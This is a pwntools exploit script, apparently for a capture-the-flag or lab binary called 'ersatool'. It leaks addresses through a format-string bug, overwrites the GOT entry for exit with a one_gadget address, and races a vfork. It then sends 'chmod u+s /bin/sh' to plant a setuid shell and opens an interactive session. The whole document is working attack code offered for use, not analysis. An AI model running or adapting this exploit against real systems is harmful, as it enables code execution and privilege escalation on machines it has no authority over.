# env: Python 3.9.2 and Pwntools v4.6.0
from pwn import *
context(log_level='INFO',arch = 'amd64',os = 'linux')

# 0. init
if args['REMOTE']:
    io = remote('127.0.0.1', 4444)
else:
    io = process('./ersatool')
elf = ELF('./ersatool')
libc = ELF('./libc.so.6', checksec=False)
io.recvuntil(b'# ')
io.sendline(b'print')
io.recvuntil(b'print->CN=',drop = True)

# 1. get main addr
payload = b'%51$p---'
io.sendline(payload)
elfbase = int(io.recvuntil(b'---',drop = True),16) - elf.symbols['main']
success(f'main addr: {elfbase:#x}')
io.recv()

# 2. get libc_base addr
printf_got = elfbase + elf.got['printf']
success(f'printf_got: {printf_got:#x}')
payload = b'%9$s----' + p64(printf_got)
io.sendline(payload)
libc_base = u64(io.recvuntil(b'----',drop = True).ljust(8, b"\x00")) - libc.symbols['printf']
success(f'libc_base addr: {libc_base:#x}')
io.recv()

# 3. get exit_got,one_gadget addr
exit_got = elfbase + elf.got['exit']
success(f'exit_got addr: {exit_got:#x}')
ones = [0x4f2c5,0x4f322,0x10a38c] # one_gadget ./libc.so.6
one_gadget = libc_base + ones[2]
success(f'one_gadget addr: {one_gadget:#x}')

# 4. override exit got addr using one_gadget address byte by byte with little-endian
#   Big-endian:   high byte of data is stored in the low address.
#   little-endian: low byte of data is stored in the low address.
i = 0
while one_gadget != 0:
    count = one_gadget & 0xff
    fmtstr = f"%{count}c%10$hhn".ljust(16,'-')
    payload = bytes(fmtstr.encode()) + p64(exit_got+i)
    io.sendline(payload)
    io.recv()
    one_gadget >>= 8
    i += 1

# 5. Now call createCN 
io.sendline(b"")
io.recvuntil(b"# ")
io.sendline(b"create")
io.recvuntil(b"create->CN=")
# gdb.attach(io)
# bypass createCN vfork() race
io.sendline(b"1234")
io.sendline(b'1234')
io.sendline(b'1234')
io.sendline(b'1234')
# may be necessary to repeat this line a few times
io.sendline(b'chmod u+s /bin/sh')
io.interactive()
